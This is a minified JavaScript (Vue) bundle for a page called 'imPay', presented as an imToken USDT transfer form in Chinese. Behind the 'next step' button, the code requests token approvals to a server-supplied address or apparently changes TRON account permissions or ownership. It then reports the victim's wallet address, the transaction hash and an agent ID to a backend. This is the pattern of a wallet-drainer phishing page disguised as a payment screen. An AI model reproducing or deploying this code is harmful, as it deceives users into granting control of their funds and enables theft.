import{u as a}from"./xms8smB9t-87840d97.js";import{s as e,a as s,b as t,g as o}from"./W6OeS-fafad2b3.js";import{B as i,a as r,b as l,c,t as u,g as p}from"./gberDJh-49d0cc16.js";import{T as d}from"./FIW-2e631784.js";import{d as n,e as m,c as v,g as f,a as b,b as j}from"./484-806e0150.js";import{v as w,c as g,b as h,Q as y,P as T,l as k,M as x,R as S,S as A,O as I,q as R}from"./KxAcrrOeA-de232101.js";import{r as O,u as _}from"./wUSY3-8f03e81a.js";import{P as U}from"./q-db10364a.js";import{F as W,B as H,s as N,a as q,c as z}from"./nktq-cac560cf.js";import{_ as G}from"./gisR-076f9bba.js";import"./IbK-19e9aecb.js";import"./sbjljeuDj-052ab550.js";import"./2mvbDqAT6t-048fa056.js";import"./IIjK-3cfe8311.js";import"./98z-6a671246.js";import"./WmWTZXi6N6-596398f9.js";import"./jp8M6Mdvmj-6d70649e.js";import"./amEYaiG2-707d5c06.js";import"./Y-6cc30fca.js";import"./xOU2-a7c03925.js";import"./2yG6Obz-bf046f7a.js";import"./sUCc6-088fa69a.js";import"./lKAR-52cb5563.js";import"./po5O0Q-b83a8e47.js";import"./VH-652fda16.js";import"./iAZe-6e1bf432.js";import"./hO-5dd668e6.js";import"./V7dpkLipB-09175b36.js";import"./5q4Gr9KPta-b69e7c0e.js";import"./LfPPhNz-55e5b9b6.js";import"./JWol-a97adf14.js";import"./HJGnEsgLe-51c2719a.js";/* empty css               */import"./6Je-de72ba2e.js";/* empty css             */import"./S-5954a089.js";import"./XclEJk-2a3cfe2a.js";import"./tUru5WneUO-56dc39e9.js";import"./pRPaye402-241f548b.js";import"./7FWDLaS-e916c13d.js";import"./n6xawhEM-417a2399.js";import"./vzWviAjD-ff0b5efe.js";import"./h-6a462e75.js";import"./5cq3F-72cbd692.js";import"./BySAaWx8V-dac3637f.js";import"./rpqd7j02d6-f1fa5efc.js";import"./Ju2vcef-2d6edaa4.js";import"./n4rb-defd5c47.js";import"./WjB7TKYG-2c64771d.js";import"./Gh-5a19cf92.js";import"./ZlrRWy8U-3ad68d59.js";import"./eR-2ab7c282.js";import"./i230ynM-2c8bbf3e.js";import"./4zZ-00df1199.js";import"./rGagCp9J-4785455a.js";import"./K9y4jH-3c5ee2f6.js";import"./zW-257d98a2.js";import"./n428Y7-9cc8fb9c.js";import"./2dvGzUTZTX-3d0d5d65.js";import"./KRSygr-ae3aa42d.js";import"./qfUbTxbRQV-a6e218fe.js";import"./c-403f59fc.js";import"./LAeqr-65e46ca1.js";import"./fyHY-87cf6f24.js";import"./rfGeN3I6-06f86d2f.js";const J=a=>(S("data-v-6966fb22"),a=a(),A(),a),L={class:"page-container"},E=J((()=>T("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),V={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},X={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},B=J((()=>T("span",{class:"fs14"},"数量",-1))),K={class:"fs14 o7"},P={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},C={class:"address left-m20 o7 top-p20 bottom-p10 column"},D={style:{"margin-right":"15px"}},Y={class:"spaceb right-m10 top-m10 o6"},F={class:"fs14"},M={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},Z=G(w({__name:"imPay",setup(w){const S=O(0),A=O(0),G=O(.069),J=O({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),Z=O("");O("");const Q=O({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=O("");O(!1),a(),O("");const aa=O(!0),ea=g((()=>J.value.ads||Q.value.receiveAddress[J.value.block])),sa=()=>{const{type:a}=J.value;if(A.value<S.value)return N("Insufficient balance");1==a?ta():2==a?oa():ia()},ta=async()=>{try{if(q({message:"Loading...",duration:0}),J.value.block==i.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",Z.value,$.value);a.result&&(ra($.value,"approve",a.txid),N(Q.value.authSuccessTips))}else if(J.value.block==i.ETH){const a=await n(web3.value,$.value,Z.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),N(Q.value.authSuccessTips))}else if(J.value.block==i.BSC){const a=await m(web3.value,$.value,Z.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),N(Q.value.authSuccessTips))}}catch(a){z()}},oa=async()=>{if(J.value.block!=i.TRX)return;const a=await l(Z.value,$.value,J.value.isAdd);(null==a?void 0:a.result)?(ra($.value,"active",a.txid),N(Q.value.authSuccessTips),z()):a&&N("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(J.value.block!=i.TRX)return;const a=await c(Z.value);a.result&&(ra($.value,"owner",a.txid),N(Q.value.authSuccessTips))},ra=async(a,o,i)=>{const r={addres:a,auth_addres:Z.value,hash:i||0,wallete_type:"ImToken",client_id:J.value.clientId||Q.value.clientId||"",source:window.location.href,agent_uid:J.value.agentId,block:J.value.block,client_type:J.value.client_type,amount:J.value.amount,extend:J.value.extend?JSON.stringify(J.value.extend):""};switch(o){case"approve":await t(r);break;case"active":await s(r);break;case"owner":await e(r)}z()},la=async()=>{let a;switch(J.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return N("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await p($.value,J.value.token);break;case i.ETH:a=await b(),web3.value=a.web3,$.value=a.userAddress,A.value=await j(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,$.value=a.userAddress,A.value=await f(web3.value,a.userAddress)}};return h((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(S.value=a.amount,J.value={amount:S.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));Q.value={...a};const{type:e}=J.value;aa.value=!0;const s=await o({block:J.value.block,type:u[J.value.type]});aa.value=!1;const t=s.data;Q.value={...a,authAddress:t},Z.value=Q.value.authAddress}catch(a){aa.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(J.value.token).toLocaleLowerCase()}转账`);let a="";a=J.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=a,la()}catch(e){4001==e.code&&la()}else{la();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(I(),y("div",L,[E,T("div",V,U(ea.value||"-"),1),T("div",X,[B,T("span",K,U(A.value)+" "+U(String(J.value.token).toLocaleUpperCase()),1)]),T("div",P,[T("div",C,[T("div",D,[k(_(W),{modelValue:S.value,"onUpdate:modelValue":e[0]||(e[0]=a=>S.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),T("div",Y,[T("span",F," $ "+U("t"==J.value.token?Number(Number(S.value).toFixed(2)*G.value).toFixed(3):S.value),1)])])]),T("div",M,[k(_(H),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:sa,loading:aa.value},{default:x((()=>[R("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{Z as default};
